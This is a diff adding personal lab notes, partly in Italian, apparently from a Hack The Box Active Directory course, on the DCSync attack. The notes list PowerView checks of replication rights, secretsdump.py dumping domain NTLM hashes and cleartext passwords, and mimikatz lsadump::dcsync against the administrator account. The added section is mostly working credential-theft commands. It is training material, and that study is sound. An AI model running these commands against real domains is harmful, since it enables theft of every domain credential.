@@ -1111,3 +1111,46 @@ In terms of cleanup, there are a few things we need to do:
 
 ### Remediation 
 booo che noia
+
+
+# DCSync
+
+DCSync e' una tecnica per rubare Active Directoy password datbase usando il builtin **Directory Replication Service Remote Protocol**. usato dai domain controller per replicare domain data.
+
+The crux of the attack is requesting a Domain Controller to replicate passwords via the DS-Replication-Get-Changes-All extended right. This is an extended access control right within AD, which allows for the replication of secret data.
+
+## using Get-DOmainUser per vedere adunn's group membership
+`PS C:\htb> Get-DomainUser -Identity adunn  |select samaccountname,objectsid,memberof,useraccountcontrol |fl`
+
+## Using Get-ObjectAcl per checkare adunn's replication rights
+```
+PS C:\htb> $sid= "S-1-5-21-3842939050-3880317879-2865463114-1164"
+PS C:\htb> Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl
+```
+
+## Estrarre NTLM Hashes e kerberos key con secretrsdump.py
+
+`j4k1dibe@htb[/htb]$ secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5`
+
+`j4k1dibe@htb[/htb]$ ls inlanefreight_hashes*`, listing the hashes kerberos keys e cleartext passwords
+
+## Enumerare di piu' cpn Get-ADUser
+`PS C:\htb> Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl`
+
+## Checking for reversible Encryption opton con Get-DomainUser
+`PS C:\htb> Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol`
+
+`j4k1dibe@htb[/htb]$ cat inlanefreight_hashes.ntds.cleartext`, printo la password in cleartext
+
+## Usiamo runas per eseguire come il tizio
+`C:\Windows\system32>runas /netonly /user:INLANEFREIGHT\adunn powershell`
+
+## Facciamo attacco con Mimikatz
+```
+PS C:\htb> .\mimikatz.exe
+
+mimikatz # privilege::debug
+
+
+mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator
+```
